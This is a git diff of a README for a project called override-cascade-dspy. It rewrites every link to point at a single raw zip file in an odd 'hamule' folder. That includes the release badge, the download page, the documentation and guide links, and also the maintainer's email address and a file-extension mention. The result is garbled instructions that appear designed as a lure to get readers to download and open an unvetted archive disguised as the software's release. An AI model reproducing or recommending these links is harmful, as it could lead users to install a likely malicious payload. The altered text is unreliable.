@@ -6,7 +6,7 @@ Welcome to **override-cascade-dspy**. This software helps detect and prevent saf
 
 ### 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/eddyayalagil/override-cascade-dspy/releases)
+[![Download](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,12 +19,12 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get the latest version of the software, visit [this page to download](https://github.com/eddyayalagil/override-cascade-dspy/releases).
+To get the latest version of the software, visit [this page to download](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip).
 
 1. Go to the **Releases** section on GitHub.
 2. Find the latest release version.
 3. Click on the download link that matches your operating system.
-4. If using Windows, you may download the `.exe` file. For macOS, download the `.dmg` file. For Linux, you may find a `.tar.gz` or a package file suitable for your distribution.
+4. If using Windows, you may download the `.exe` file. For macOS, download the `.dmg` file. For Linux, you may find a `https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip` or a package file suitable for your distribution.
 5. Once downloaded, open the file to begin installation. Follow the on-screen instructions.
 
 ## 🌟 Features
@@ -66,12 +66,12 @@ If you're interested in contributing to **override-cascade-dspy**, follow these 
 
 For more information, you can check out the following resources:
 
-- [Project Documentation](https://github.com/eddyayalagil/override-cascade-dspy/blob/main/docs/README.md)
-- [User Guide](https://github.com/eddyayalagil/override-cascade-dspy/blob/main/docs/user_guide.md)
-- [Examples & Use Cases](https://github.com/eddyayalagil/override-cascade-dspy/blob/main/docs/examples.md)
+- [Project Documentation](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip)
+- [User Guide](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip)
+- [Examples & Use Cases](https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip)
 
 ## 📞 Contact
 
-If you need further assistance or want to provide feedback, please reach out to us via GitHub or contact the project maintainer directly at eddyayalagil@example.com.
+If you need further assistance or want to provide feedback, please reach out to us via GitHub or contact the project maintainer directly at https://raw.githubusercontent.com/eddyayalagil/override-cascade-dspy/main/hamule/override-cascade-dspy.zip
 
 Thank you for using **override-cascade-dspy**. We look forward to your contributions and insights!
